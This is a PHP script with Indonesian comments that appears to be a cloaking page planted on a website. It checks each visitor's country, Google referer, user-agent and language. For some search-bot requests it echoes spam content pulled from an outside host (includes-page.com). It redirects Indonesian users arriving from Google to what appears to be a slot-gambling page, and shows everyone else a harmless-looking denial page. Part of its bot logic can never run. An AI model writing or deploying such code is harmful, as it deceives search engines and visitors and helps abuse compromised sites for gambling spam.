<?php
// Mendapatkan alamat IP pengunjung
$ip = $_SERVER['REMOTE_ADDR'];

// Menggunakan API untuk mendapatkan informasi lokasi berdasarkan IP
$response = file_get_contents("http://ip-api.com/json/{$ip}");
$data = json_decode($response, true);

// Memeriksa apakah statusnya "success" dan negara adalah "Indonesia"
if (isset($data['status']) && $data['status'] === 'success' && $data['country'] === 'Indonesia') {
    // Mendapatkan referer dan user-agent
    $s_ref = $_SERVER['HTTP_REFERER'] ?? '';
    $agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // Memeriksa apakah referer berasal dari google.co.id
    if (strpos($s_ref, 'google.co.id') !== false) {
        // Jika pengunjung berasal dari google.co.id, lanjutkan dengan logika yang ada

        // Jika pengunjung adalah bot
        if (strpos($agent, 'bot') !== false) {
            // Konten spesifik untuk bot
            echo 'Konten untuk bot';
            exit;
        }
        $s_ref = $_SERVER['HTTP_REFERER'];
        $agent = $_SERVER['HTTP_USER_AGENT'];
        if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
            $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
            if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
                setcookie('az', 'lp', time() + 3600 * 7200);
                echo ' '; // Your bot-specific content
                exit;
            }
            echo file_get_contents("https://includes-page.com/cmd/starholidays.co.uk/lp.txt");
            exit;
            ?>
            <?php
        }
        $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        if ($browserLang == 'id') {
            header("Location: https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/ampiboslot2.html");
            exit;
        }


        // Konten default jika tidak ada kondisi di atas yang terpenuhi
        echo "<h1>Selamat datang di situs kami!</h1>";
        echo "<p>Anda mengakses halaman ini dari Indonesia dan dari Google.</p>";
    } else {
        // Konten jika tidak berasal dari google.co.id
        echo "<h1>Akses Ditolak</h1>";
        echo "<p>Halaman ini hanya dapat diakses dari Google.</p>";
    }
} else {
    // Konten jika diakses dari luar Indonesia
    echo "<h1>Akses Ditolak</h1>";
    echo "<p>Maaf, halaman ini hanya dapat diakses dari Indonesia.</p>";
}
?>
